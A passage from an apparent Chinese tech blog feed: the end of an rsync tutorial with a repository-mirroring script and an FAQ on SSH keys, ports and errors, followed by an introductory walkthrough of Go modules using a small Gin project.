class="variable">$RUN</span>"</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> already running</span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rsync -az vger.rutgers.edu::cvs/CVSROOT/ChangeLog <span class="variable">$HOME</span>/ChangeLog</span><br><span class="line"></span><br><span class="line">sum1=`sum <span class="variable">$HOME</span>/ChangeLog`</span><br><span class="line">sum2=`sum /var/www/cvs/vger/CVSROOT/ChangeLog`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$sum1</span>"</span> = <span class="string">"<span class="variable">$sum2</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> nothing to <span class="keyword">do</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">rsync -az --delete --force vger.rutgers.edu::cvs/ /var/www/cvs/vger/</span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Q：如何通过 ssh 进行 rsync，而且无须输入密码？</p><p>A：可以通过以下几个步骤</p><pre><code>* 通过 ssh-keygen 在 server A 上建立 SSH keys，不要指定密码，你会在~/.ssh 下看到 identity 和 identity.pub 文件* 在 server B 上的 home 目录建立子目录. ssh* 将 A 的 identity.pub 拷贝到 server B 上* 将 identity.pub 加到`~[user b]/.ssh/authorized_keys`* 于是 server A 上的 A 用户，可通过下面命令以用户 B ssh 到 server B 上了 e.g.`ssh -l userB serverB`* 这样就使 server A 上的用户 A 就可以 ssh 以用户 B 的身份无需密码登陆到 server B 上了。</code></pre><p>Q：如何通过在不危害安全的情况下通过防火墙使用 rsync?</p><p>A：解答如下：</p><p>这通常有两种情况，一种是服务器在防火墙内，一种是服务器在防火墙外。无论哪种情况，通常还是使用 ssh，这时最好新建一个备份用户，并且配置 sshd 仅允许这个用户通过 RSA 认证方式进入。如果服务器在防火墙内，则最好限定客户端的 IP 地址，拒绝其它所有连接。如果客户机在防火墙内，则可以简 单允许防火墙打开 TCP 端口 22 的 ssh 外发连接就 ok 了。</p><p>Q：我能将更改过或者删除的文件也备份上来吗？</p><p>A：当然可以：</p><p>你可以使用如：<code>rsync -other -options -backupdir = ./backup-2000-2-13 ...</code>这样的命令来实现。<br>这样如果源文件:/path/to/some/file.c 改变了，那么旧的文件就会被移到./backup-2000-2-13/path/to/some/file.c，<br>这里这个目录需要自己手工建立起来</p><p>Q：我需要在防火墙上开放哪些端口以适应 rsync？</p><p>A：视情况而定</p><p>rsync 可以直接通过 873 端口的 tcp 连接传文件，也可以通过 22 端口的 ssh 来进行文件传递，但你也可以通过下列命令改变它的端口：<br><code>rsync --port 8730 otherhost::</code><br>或者<br><code>rsync -e 'ssh -p 2002' otherhost:</code></p><p>Q：我如何通过 rsync 只复制目录结构，忽略掉文件呢？</p><p>A：<code>rsync -av --include '*/' --exclude '*' source-dir dest-dir</code></p><p>Q：为什么我总会出现 “Read-only file system” 的错误呢？</p><p>A：看看是否忘了设 “read only = no” 了</p><p>Q：为什么我会出现‘@ERROR: invalid gid’的错误呢？</p><p>A：rsync 使用时默认是用 uid=nobody;gid=nobody 来运行的，如果你的系统不存在 nobody 组的话，就会出现这样的错误，可以试试 gid = nogroup 或者其它</p><p>Q：绑定端口 873 失败是怎么回事？</p><p>A：如果你不是以 root 权限运行这一守护进程的话，因为 1024 端口以下是特权端口，会出现这样的错误。你可以用–port 参数来改变。</p><p>Q：为什么我认证失败？</p><p>A：从你的命令行看来：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ rsync -a 144.16.251.213::<span class="built_in">test</span> <span class="built_in">test</span></span><br><span class="line">Password:</span><br><span class="line">@ERROR: auth failed on module <span class="built_in">test</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>应该是没有以你的用户名登陆导致的问题，试试<code>rsync -a max@144.16.251.213::test test</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是-Rsync&quot;&gt;&lt;a href=&quot;#什么是-Rsync&quot; class=&quot;headerlink&quot; title=&quot;什么是 Rsync&quot;&gt;&lt;/a&gt;什么是 Rsync&lt;/h2&gt;&lt;p&gt;Rsync（remote synchronize）是一个远程数据同步工具，可通过 L
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Modules 初试 -- Go 包管理解决之道</title>
    <link href="https://jiemin.wang/2019/03/29/goModules/"/>
    <id>https://jiemin.wang/2019/03/29/goModules/</id>
    <published>2019-03-29T03:16:13.000Z</published>
    <updated>2019-03-29T04:41:58.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Go 的包管理是一直是为人诟病之处，从 Go 1.5 引入的 vendor 机制，到准官方工具 dep，目前为止还没一个简便的解决方案</p><p>不过现在 go modules 随着 golang1.11 的发布而和我们见面了，这是官方提倡的新的包管理，乃至项目管理机制，可以不再需要 GOPATH 的存在。<br><img src="/2019/03/29/goModules/go-module.jpg" title="go-module"></p><p>欣喜之余，赶紧上手来试一下吧~</p><p><strong>Go modules 的前世今生</strong></p><p>说起 Go 的包依赖管理，作为 Google 脑残粉的我也是连连叹气。。。</p><p>如果说 Java(Maven) 是坨 shit 的话，那 Go 真是连 Java 都不如。</p><p>自 2007 年 “三巨头”（<a href="https://github.com/griesemer" target="_blank" rel="noopener">Robert Griesemer</a>, <a href="https://en.wikipedia.org/wiki/Rob_Pike" target="_blank" rel="noopener">Rob Pike</a>, <a href="https://en.wikipedia.org/wiki/Ken_Thompson" target="_blank" rel="noopener">Ken Thompson</a>）提出设计和实现 <a href="https://golang.org/" target="_blank" rel="noopener">Go 语言</a>以来，这门语言已经发展和演化了十余年了。</p><p>但是自从 Go 语言诞生以来吧，大佬们就认为<code>go get</code> 已经挺好了，没必要再额外造一个轮子了——包管理器。</p><p>也许是大佬们都不需要团队开发吧，但是大佬毕竟是少数，于是，各种各样的社区解决方案就出现了，可谓是百家争鸣。</p><ul><li><a href="https://github.com/golang/dep" target="_blank" rel="noopener">dep</a></li><li><a href="https://github.com/kovetskiy/manul" target="_blank" rel="noopener">manul</a> - Vendor packages using git submodules.</li><li><a href="https://github.com/tools/godep" target="_blank" rel="noopener">Godep</a></li><li><a href="https://github.com/kardianos/govendor" target="_blank" rel="noopener">Govendor</a></li><li><a href="https://github.com/hectorj/godm" target="_blank" rel="noopener">godm</a></li><li><a href="https://github.com/govend/govend" target="_blank" rel="noopener">govend</a> - Manage dependencies like <code>go get</code> but for <code>/vendor</code>.</li><li><a href="https://github.com/Masterminds/glide" target="_blank" rel="noopener">Glide</a> - Manage packages like composer, npm, bundler, or other languages.</li></ul><p>当初看到这个列表的时候，我不禁感慨：“这么多的解决方案，可真是挑花了朕的眼睛呀。”</p><p>Go 官方说：“莫急，这份<a href="https://github.com/golang/go/wiki/PackageManagementTools" target="_blank" rel="noopener">官方对比</a>拿好不谢。”</p><p>Go 在构建设计方面深受 Google 内部开发实践的影响，比如 go get 的设计就深受 <a href="https://cacm.acm.org/magazines/2016/7/204032-why-google-stores-billions-of-lines-of-code-in-a-single-repository/pdf" target="_blank" rel="noopener">Google 内部单一代码仓库 (single monorepo) 和基于主干 (trunk/mainline based) 的开发模型</a>的影响：只获取 Trunk/mainline 代码和版本无感知。<br><img src="/2019/03/29/goModules/google-trunk-based-and-release-branch-dev-model.png" title="google-trunk-based-and-release-branch-dev-model"></p><blockquote><p>Google 内部基于主干的开发模型：</p><ul><li>所有开发人员基于主干 trunk/mainline 开发：提交到 trunk 或从 trunk 获取最新的代码（同步到本地 workspace）</li><li>版本发布时，建立 Release branch，release branch 实质上就是某一个时刻主干代码的快照</li><li>必须同步到 release branch 上的 bug fix 和增强改进代码也通常是先在 trunk 上提交 (commit)，然后再 cherry-pick 到 release branch 上</li></ul></blockquote><p>我们知道 go get 获取的代码会放在 $GOPATH/src 下面，而 go build 会在 $GOROOT/src 和 \$GOPATH/src 下面按照 import path 去搜索 package，由于 go get 获取的都是各个 package repo 的 trunk/mainline 的代码，因此，Go 1.5 之前的 Go compiler 都是基于目标 Go 程序依赖包的 trunk/mainline 代码去编译的。这样的机制带来的问题是显而易见的，至少包括：</p><ul><li>因依赖包的 trunk 的变化，导致不同人获取和编译你的包 / 程序时得到的结果实质是不同的，即不能实现 reproduceable build</li><li>因依赖包的 trunk 的变化，引入不兼容的实现，导致你的包 / 程序无法通过编译</li><li>因依赖包演进而无法通过编译，导致你的包 / 程序无法通过编译</li></ul><p>为了实现 reporduceable build，Go 1.5 引入了 Vendor 机制，Go 编译器会优先在 vendor 下搜索依赖的第三方包，这样如果开发者将特定版本的依赖包存放在 vendor 下面并提交到 code repo，那么所有人理论上都会得到同样的编译结果，从而实现 reporduceable build。</p><p>在 Go 1.5 发布后的若干年，gopher 们把注意力都集中在如何利用 vendor 解决包依赖问题，从手工添加依赖到 vendor、手工更新依赖，到一众包依赖管理工具的诞生，比如：<a href="https://github.com/kardianos/govendor" target="_blank" rel="noopener">Govendor</a>、<a href="https://github.com/Masterminds/glide" target="_blank" rel="noopener">glide</a> 以及号称准官方工具的 <a href="https://github.com/golang/dep" target="_blank" rel="noopener">dep</a>，努力地尝试着按照当今主流思路解决着诸如 “钻石型依赖” 等难题。</p><p>正当 gopher 认为 dep 将 “顺理成章” 地升级为 go toolchain 一部分的时候，今年年初，Go 核心 Team 的技术 leader，也是 Go Team 最早期成员之一的 <a href="https://research.swtch.com/" target="_blank" rel="noopener">Russ Cox</a> 在<a href="https://research.swtch.com/" target="_blank" rel="noopener">个人博客</a>上连续发表了<a href="https://research.swtch.com/vgo" target="_blank" rel="noopener">七篇文章</a>，系统阐述了 Go team 解决” 包依赖管理” 的技术方案: <a href="https://github.com/golang/vgo" target="_blank" rel="noopener">vgo</a> —— modules 的前身。</p><p>vgo 的主要思路包括：<a href="https://research.swtch.com/vgo-import" target="_blank" rel="noopener">Semantic Import Versioning</a>、<a href="https://research.swtch.com/vgo-mvs" target="_blank" rel="noopener">Minimal Version Selection</a>、<a href="https://research.swtch.com/vgo-module" target="_blank" rel="noopener">引入 Go module</a> 等。这七篇文章的发布引发了 Go 社区激烈地争论，尤其是 MVS(最小版本选择) 与目前主流的依赖版本选择方法的相悖让很多传统 Go 包管理工具的维护者” 不满”，尤其是” 准官方工具”：dep。vgo 方案的提出也意味着 dep 项目的生命周期即将进入尾声。</p><p>5 月份，Russ Cox 的 <a href="https://github.com/golang/go/issues/24301" target="_blank" rel="noopener">Proposal “cmd/go: add package version support to Go toolchain” </a>被 accepted，这周五早些时候 Russ Cox <a href="https://github.com/golang/go/commit/f7248f05946c1804b5519d0b3eb0db054dc9c5d6" target="_blank" rel="noopener">将 vgo 的代码 merge 到 Go 主干</a>，并将这套机制正式命名为”go modules”。由于 vgo 项目本身就是一个实验原型，merge 到主干后，vgo 这个术语以及 vgo 项目的使命也就就此结束了。后续 Go modules 机制将直接在 Go 主干上继续演化。</p><p>Go modules 是 Go team 在解决包依赖管理方面的一次勇敢尝试，无论如何，对 Go 语言来说都是一个好事。</p><h2 id="Go-modules-上手"><a href="#Go-modules-上手" class="headerlink" title="Go modules 上手"></a>Go modules 上手</h2><p>这里就用 Gin 框架来实现两个 RESTful API 作示例吧，目录结构如下，两个 handler 分别属于 <code>main</code> 和 <code>pkg/api/data</code> 这两个 package<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mytest</span><br><span class="line">├── main.<span class="keyword">go</span></span><br><span class="line">└── pkg</span><br><span class="line">    └── api</span><br><span class="line">        └── data</span><br><span class="line">            └── api.<span class="keyword">go</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>进入 myproj 目录，然后使用 <code>go mod</code> 建立 modules<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> mod init github.com/wangjiemin/mytest</span><br><span class="line"><span class="keyword">go</span>: creating <span class="built_in">new</span> <span class="keyword">go</span>.mod: module github.com/wangjiemin/mytest</span><br></pre></td></tr></tbody></table></figure><p></p><p>此时会自动产生一个 go.mod 文件，打开看到里边内容只有一行<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module github.com/wangjiemin/mytest</span><br></pre></td></tr></tbody></table></figure><p></p><p>现在开始写我们的两个 handler<br>1.pkg/api/data/api.go<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetDataAPIHealthHandler GET /health-dataapi to expose heathy check result of data API</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetDataAPIHealthHandler</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">    <span class="comment">// do something to check heathy of data API</span></span><br><span class="line">    c.JSON(http.StatusOK, gin.H{</span><br><span class="line">        <span class="string">"code"</span>:    <span class="number">0</span>,</span><br><span class="line">        <span class="string">"message"</span>: <span class="string">"Data API is alive"</span>,</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.main.go<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    dataapi <span class="string">"github.com/wangjiemin/mytest/pkg/api/data"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    router := gin.Default()</span><br><span class="line"></span><br><span class="line">    router.GET(<span class="string">"/health"</span>, GetHealthHandler)</span><br><span class="line">    router.GET(<span class="string">"/health-dataapi"</span>, dataapi.GetDataAPIHealthHandler)</span><br><span class="line"></span><br><span class="line">    s := &http.Server{</span><br><span class="line">        Addr:    <span class="string">":8000"</span>,</span><br><span class="line">        Handler: router,</span><br><span class="line">    }</span><br><span class="line">    s.ListenAndServe()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetHealthHandler - GET /health to expose service health</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHealthHandler</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">    c.JSON(http.StatusOK, gin.H{</span><br><span class="line">        <span class="string">"code"</span>:    <span class="number">0</span>,</span><br><span class="line">        <span class="string">"message"</span>: <span class="string">"Service is alive!"</span>,</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后用我们的老朋友 <code>go build</code> 创建可执行文件<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build -o bin/main main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">go</span>: finding github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: finding github.com/gin-contrib/sse latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/ugorji/<span class="keyword">go</span>/codec latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/golang/protobuf/proto latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7</span><br><span class="line"><span class="keyword">go</span>: downloading github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f</span><br><span class="line"><span class="keyword">go</span>: finding github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: downloading gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">go</span>: downloading gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/check.v1 v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20161208181325</span><span class="number">-20d</span>25e280405</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到 go compiler 主动下载了相关 package。</p><p>那么这些 package 被下载到了哪里呢，你打开 $GOPATH/pkg/mod 就可以看到了，另外 modules 是允许同 package 多种版本并存的。<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">go</span>/pkg/mod</span><br><span class="line">├── cache</span><br><span class="line">│   ├── download</span><br><span class="line">│   │   ├── github.com</span><br><span class="line">│   │   └── gopkg.in</span><br><span class="line">│   └── vcs</span><br><span class="line">│       ├── <span class="number">37981</span>a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b</span><br><span class="line">│       ├── <span class="number">37981</span>a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b.info</span><br><span class="line">│       ├── <span class="number">3</span>cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f</span><br><span class="line">│       ├── <span class="number">3</span>cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f.info</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们看看执行 <code>go build</code> 后 go.mod 文件的内容：<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module github.com/wangjiemin/mytest</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">  github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7 <span class="comment">// indirect</span></span><br><span class="line">  github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line">  github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span> <span class="comment">// indirect</span></span><br><span class="line">  github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span> <span class="comment">// indirect</span></span><br><span class="line">  github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f <span class="comment">// indirect</span></span><br><span class="line">  gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span> <span class="comment">// indirect</span></span><br><span class="line">  gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span> <span class="comment">// indirect</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们看到 go modules 分析出了 mytest 的依赖，并将其放入 go.mod 的 require 区域。</p><blockquote><p>go modules 拉取 package 的原则是先拉取最新的 release tag，若无 tag 则拉最新 commit 并以 Pseudo-versions 的形式记录。<br>因为我们的 module 只直接依赖了 gin，其他的都是非直接依赖的，所以它们后边都被以注释形式标记了 indirect，即传递依赖。<br>go.mod 文件一旦创建后，它的内容将会被 go toolchain 全面掌控。go toolchain 会在各类命令执行时，比如 go get、go build、go mod 等修改和维护 go.mod 文件。</p></blockquote><p>同时发现目录下多了一个文件 go.sum<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7 h1:AzN37oI0cOS+cougNAV9szl6CVoj2RYwzS3DpUQNtlY=</span><br><span class="line">github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7/<span class="keyword">go</span>.mod h1:VJ0WA2NBN22VlZ2dKZQPAPnyWw5XTlK1KymzLKsr59s=</span><br><span class="line">github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span> h1:kCmZyPklC0gVdL728E6Aj20uYBJV93nj/TkwBTKhFbs=</span><br><span class="line">github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">7</span>cKuhb5qV2ggCFctp2fJQ+ErvciLZrIeoOSOm6mUr7Y=</span><br><span class="line">github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span> h1:P3YflyNX/ehuJFLhxviNdFxQPkGK5cDcApsge1SqnvM=</span><br><span class="line">github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">6l</span>Qm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=</span><br><span class="line">github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span> h1:bnP0vzxcAdeI1zdubAl5PjU6zsERjGZb7raWodagDYs=</span><br><span class="line">github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span>/<span class="keyword">go</span>.mod h1:M+lRXTBqGeGNdLjl/ufCoiOlB5xdOkqRJdNxMWT7Zi4=</span><br><span class="line">github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f h1:y3Vj7GoDdcBkxFa2RUUFKM25TrBbWVDnjRDI0u975zQ=</span><br><span class="line">github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f/<span class="keyword">go</span>.mod h1:VFNgLljTbGfSG7qAOspJ7OScBnGdDN/yBr0sguwnwf0=</span><br><span class="line">gopkg.in/check.v1 v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20161208181325</span><span class="number">-20d</span>25e280405/<span class="keyword">go</span>.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=</span><br><span class="line">gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span> h1:lFB4DoMU6B626w8ny76MV7VX6W2VHct2GVOI3xgiMrQ=</span><br><span class="line">gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span>/<span class="keyword">go</span>.mod h1:RX2a/<span class="number">7</span>Ha8BgOhfk7j780h4/u/RRjR0eouCJSH80/M2Y=</span><br><span class="line">gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span> h1:mUhvW9EsL+naU5Q3cakzfE91YhliOondGd6ZrsDBHQE=</span><br><span class="line">gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span>/<span class="keyword">go</span>.mod h1:hI93XBmqTisBFMUTm0b8Fm+jr3Dg1NNxqwp+<span class="number">5</span>A1VGuI=</span><br></pre></td></tr></tbody></table></figure><p></p><p>写过 node 的人应该会发现， <code>go.mod/go.sum</code> 的关系跟 <code>package.json/package-lock.json</code> 类似，前者定义 dependency root，后者将关系展开。</p><p>最后执行 <code>bin/main</code> 可以看到 Gin 很贴心的列出了 handler 所属的 package<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./bin/main</span><br><span class="line">[GIN-debug] [WARNING] Now Gin requires Go <span class="number">1.6</span> or later and Go <span class="number">1.7</span> will be required soon.</span><br><span class="line"></span><br><span class="line">[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.</span><br><span class="line"></span><br><span class="line">[GIN-debug] [WARNING] Running in <span class="string">"debug"</span> mode. Switch to <span class="string">"release"</span> mode in production.</span><br><span class="line"> - using env: export GIN_MODE=release</span><br><span class="line"> - using code: gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] GET    /health                   --> main.GetHealthHandler (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] GET    /health-dataapi           --> github.com/wangjiemin/mytest/pkg/api/data.GetDataAPIHealthHandler (<span class="number">3</span> handlers)</span><br></pre></td></tr></tbody></table></figure><p></p><p>到这里，一个 go modules 就完成了。</p><h4 id="GO111MODULE"><a href="#GO111MODULE" class="headerlink" title="GO111MODULE"></a>GO111MODULE</h4><p>Modules 是作为 experiment feature 加入到不久前正式发布的 Go 1.11 中的。</p><p>按照 Go 的惯例，在新的 experiment feature 首次加入时，都会有一个特性开关，go modules 也不例外，<code>GO111MODULE</code> 这个临时的环境变量就是 go modules 特性的 experiment 开关。</p><ul><li>off: go modules experiment feature 关闭，go compiler 会始终使用 GOPATH mode，即无论要构建的源码目录是否在 GOPATH 路径下，go compiler 都会在传统的 GOPATH 和 vendor 目录 (仅支持在 GOPATH 目录下的 package) 下搜索目标程序依赖的 go package；</li><li>on: 始终使用 module-aware mode，只根据 go.mod 下载 dependency 而完全忽略 GOPATH 以及 vendor 目录</li></ul><ul><li>auto: Golang 1.11 预设值，使用 GOPATH mode 还是 module-aware mode，取决于要构建的源码目录所在位置以及是否包含 go.mod 文件。满足任一条件时才使用 module-aware mode:<ul><li>当前目录位于 GOPATH/src 之外并且包含 go.mod 文件</li><li>当前目录位于包含 go.mod 文件的目录下    </li></ul></li></ul><p><code>go mod</code> 命令<br></p><figure class="highlight 